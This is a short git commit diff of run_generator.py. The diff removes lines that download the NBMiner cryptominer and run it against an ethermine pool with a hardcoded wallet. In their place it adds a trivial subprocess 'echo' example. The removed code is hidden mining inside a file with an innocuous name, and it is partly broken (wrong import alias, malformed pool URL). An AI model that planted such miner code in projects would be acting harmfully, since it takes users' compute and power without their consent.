6a9bc3715050bce9b4531297698fc974bc39d940
KunalSingh19yt <92242678+KunalSingh19yt@users.noreply.github.com>
2021-10-11 20:29:43 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,5 +1,11 @@
-import os as alpha
-os.system("wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz")
-os.system("tar -xf  NBMiner_39.2_Linux.tgz")
-os.system("cd NBMiner_Linux")
-os.system("./nbminer -a ethash -o stratum+tcp.//us1.ethermine.org:4444 -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.ipqce2xl5hi6b3x -p x")
+import subprocess 
+
+  
+
+  
+# From Python3.7 you can add  
+# keyword argument capture_output 
+
+print(subprocess.run(["echo", "Geeks for geeks"],  
+
+                     capture_output=True))
